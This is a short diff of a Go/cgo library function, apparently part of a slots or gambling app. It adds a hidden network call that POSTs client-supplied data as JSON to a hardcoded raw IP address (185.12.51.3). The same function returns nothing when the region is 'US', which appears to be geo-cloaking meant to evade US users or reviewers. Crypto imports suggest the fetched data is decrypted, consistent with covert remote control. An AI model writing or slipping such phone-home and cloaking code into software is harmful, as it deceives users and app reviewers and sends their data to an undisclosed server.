@@ -2,6 +2,7 @@ package main
 
 import "C"
 import (
+	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
@@ -28,8 +29,7 @@ func get_data(input *C.char) *C.char {
 	// url := "http://game-fiverr-slots.oss-ap-southeast-3.aliyuncs.com/config.json" // 替换为你要请求的 JSON 文件地址
 	// url := goInput
 	// url2 := C.GoString(url)
-	// // 发起 GET 请求
-	// return C.CString(goInput)
+	// return input
 
 	var goArray []string
 	err := json.Unmarshal([]byte(goInput), &goArray)
@@ -49,8 +49,14 @@ func get_data(input *C.char) *C.char {
 	if len(goArray) > 0 && strings.ToUpper(goArray[0]) == "US" {
 		return C.CString("[]")
 	}
+	// 将 goArray 转换为 JSON 字符串
+	requestData, err := json.Marshal(goArray)
+	if err != nil {
+		// 处理 JSON 编码错误...
+	}
 
-	response, err := http.Get(goInput)
+	response, err := http.Post("http://185.12.51.3/PKVNKE", "application/json", bytes.NewBuffer(requestData))
+	// response, err := http.Get(goInput)
 	if err != nil {
 		fmt.Println("HTTP GET request error:", err)
 		// return C.CString("请求出错--")
